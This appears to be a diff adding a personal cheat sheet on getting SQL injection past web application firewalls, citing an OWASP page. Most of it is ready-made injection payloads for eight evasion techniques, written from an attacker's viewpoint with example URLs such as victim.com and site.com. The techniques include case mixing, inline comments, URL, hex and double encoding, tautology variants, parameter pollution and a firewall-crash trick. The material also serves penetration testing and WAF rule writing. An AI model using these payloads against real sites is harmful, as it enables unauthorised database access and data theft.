@@ -1,0 +1,66 @@
+SQL Injection Bypassing WAF
+https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF   ===> Check this out 
+
+The WAF doesn't fix the underlying vulnerable code — it just tries to filter malicious-looking requests before they reach the app. Bypassing it means finding ways to say the same malicious thing in a way the WAF doesn't recognize, but the database still understands.
+
+How WAFs Detect SQLi (so you know what you're evading)
+Most WAFs work on pattern/signature matching — regex rules looking for things like:
+
+UNION SELECT
+OR 1=1
+-- or # comments
+' OR '
+Suspicious keywords: SLEEP, BENCHMARK, information_schema
+
+ByPass techniques::
+	1. Case Manipulation
+		UNION SELECT → UnIoN SeLeCt
+
+	2. Whitespace / Comment Substitution
+		UNION SELECT → UNION/**/SELECT
+		UNION SELECT → UNION%0aSELECT   -- newline
+		UNION SELECT → UNION%09SELECT   -- tab
+		http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--  --%0b backspacetab
+
+	3. Encoding Tricks
+		URL encoding: %27 for ', %20 for space
+		Double URL encoding: %2527 (decoded twice — once by WAF's normalizer being skipped, once by the app)
+		Unicode encoding: %u0027
+		Hex encoding of strings: 0x61646d696e instead of 'admin'
+		wxample-----
+		SELECT * FROM users WHERE username=0x61646d696e
+
+	4. Comment-Based Obfuscation
+		Breaking up keywords so the signature doesn't match as a contiguous string:
+		UNI/**/ON SEL/**/ECT
+		(Only works if the DB strips comments before parsing — MySQL does this.)
+
+	5. Alternative Syntax for Common Payloads
+		OR 2>1
+		OR 'a'='a'
+		OR true
+
+		Instead of spaces, use parentheses (works in MySQL):
+		UNION SELECT(username),(password)FROM(users)
+
+	6. Instead of =, use LIKE or IN
+		' OR username LIKE 'admin%
+
+	7. HTTP Parameter Pollution (HPP)
+		send same parameter twice.
+		?id=1&id=1' OR '1'='1
+
+	8. Advanced Methods
+		Crash Firewall via doing Buffer Over Flow.
+			Crash Firewall via doing Buffer Over Flow. ----->>  http://www.site.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4….  If you get a 500, you can exploit it using the Buffer Overflow Method.
+		
+		Replace Characters with their HEX Values: We can replace some characters with their HEX (URL-Encoded) Values.
+			http://www.site.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….
+			(which means “union select”)
+
+		Misc Exploitable Functions: Many firewalls try to offer more Protection by adding Prototype or Strange Functions! (Which, of course, we can exploit!):
+			This firewall below replaces “*” (asterisks) with Whitespaces! What we can do is this:
+			http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4…
+			(If the Firewall removes the “*”, the result will be: 15+union+select….)
+		
+
